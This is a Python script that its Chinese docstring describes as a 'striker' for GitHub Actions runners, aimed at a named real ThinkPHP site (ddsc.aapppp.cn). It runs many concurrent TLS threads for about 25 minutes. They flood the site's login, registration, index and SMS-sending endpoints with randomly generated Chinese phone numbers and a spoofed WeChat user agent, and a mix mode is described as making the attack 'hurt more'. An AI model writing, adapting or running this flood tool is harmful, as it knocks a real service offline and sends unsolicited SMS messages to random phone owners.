#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GitHub Actions 专用打击器 —— 针对 鬼马轻食家 (ddsc.aapppp.cn / ThinkPHP aid=540)
零依赖, runner 上直接 python3 跑。
用法:
  python3 runner_blast.py -c 100 -n 1500
  python3 runner_blast.py -c 100 -n 1500 --mode index
"""
import argparse, random, socket, ssl, string, sys, threading, time

TARGETS = {
    "loginsub": ("POST", "/?s=/ApiIndex/loginsub&aid=540&platform=wx&session_id=&pid=0"),
    "sendsms":  ("POST", "/?s=/ApiIndex/sendsms&aid=540&platform=wx&session_id=&pid=0"),
    "index":    ("GET",  "/?s=/ApiIndex/index&aid=540&platform=wx&session_id=&pid=0"),
    "login":    ("GET",  "/?s=/ApiIndex/login&aid=540&platform=wx&session_id=&pid=0"),
    "regsub":   ("POST", "/?s=/ApiIndex/regsub&aid=540&platform=wx&session_id=&pid=0"),
}

UA = ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 "
      "Mobile/15E148 MicroMessenger/8.0.49(0x18003123) NetType/WIFI Language/zh_CN")
lock = threading.Lock()
st = {"sent": 0, "resp": 0, "err": 0, "lat": [], "max": 0.0}
t0 = time.time()


def tel():
    return random.choice(["130", "131", "135", "136", "137", "138", "139", "150", "151",
                          "158", "159", "180", "181", "186", "187", "188", "199"]) + \
        "".join(random.choices(string.digits, k=8))


def worker(host, method, path, mode, dur):
    ctx = ssl._create_unverified_context()
    end = time.time() + dur
    sock = None
    while time.time() < end:
        try:
            if sock is None:
                sock = socket.create_connection((host, 443), timeout=8)
                sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.settimeout(8)
            if method == "POST":
                body = f"tel={tel()}&pwd=12345678&smscode=&logintype=1&pid=0&yqcode=".encode()
                req = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {UA}\r\n"
                       f"Content-Type: application/x-www-form-urlencoded\r\n"
                       f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n").encode() + body
            else:
                req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {UA}\r\n"
                       f"Connection: keep-alive\r\n\r\n").encode()
            ts = time.time()
            sock.sendall(req)
            with lock:
                st["sent"] += 1
            buf = b""
            while b"\r\n\r\n" not in buf:
                c = sock.recv(8192)
                if not c:
                    raise ConnectionError("closed")
                buf += c
            head, rest = buf.split(b"\r\n\r\n", 1)
            clen = 0
            for line in head.split(b"\r\n"):
                if line.lower().startswith(b"content-length:"):
                    try:
                        clen = int(line.split(b":")[1])
                    except Exception:
                        clen = 0
            while len(rest) < clen:
                c = sock.recv(8192)
                if not c:
                    break
                rest += c
            dt = time.time() - ts
            with lock:
                st["resp"] += 1
                st["lat"].append(dt)
                st["max"] = max(st["max"], dt)
        except Exception:
            with lock:
                st["err"] += 1
            try:
                sock.close()
            except Exception:
                pass
            sock = None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-H", "--host", default="ddsc.aapppp.cn")
    ap.add_argument("-c", "--conc", type=int, default=100)
    ap.add_argument("-n", "--dur", type=int, default=1500)
    ap.add_argument("--mode", default="loginsub", choices=list(TARGETS.keys()))
    ap.add_argument("--mix", action="store_true", help="四个接口混合打(更难受)")
    a = ap.parse_args()

    threads = []
    for i in range(a.conc):
        if a.mix:
            mode = list(TARGETS.keys())[i % 4]
        else:
            mode = a.mode
        method, path = TARGETS[mode]
        threads.append(threading.Thread(target=worker, daemon=True,
                                        args=(a.host, method, path, mode, a.dur)))
    for t in threads:
        t.start()
    print(f"[start] host={a.host} conc={a.conc} dur={a.dur} mode={a.mode} mix={a.mix}", flush=True)
    while any(t.is_alive() for t in threads):
        time.sleep(10)
        el = max(time.time() - t0, .001)
        avg = sum(st["lat"]) / len(st["lat"]) * 1000 if st["lat"] else 0
        print(f"[{el:5.0f}s] sent={st['sent']:>7} resp={st['resp']:>7} err={st['err']:>6} "
              f"rps={st['resp']/el:7.1f} avg={avg:6.0f}ms max={st['max']*1000:6.0f}ms", flush=True)
    lat = sorted(st["lat"])
    print(f"\n[done] sent={st['sent']} resp={st['resp']} err={st['err']}")
    if lat:
        p = lambda q: lat[min(len(lat) - 1, int(len(lat) * q))] * 1000
        print(f"[lat] p50={p(.5):.0f}ms p90={p(.9):.0f}ms p99={p(.99):.0f}ms")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
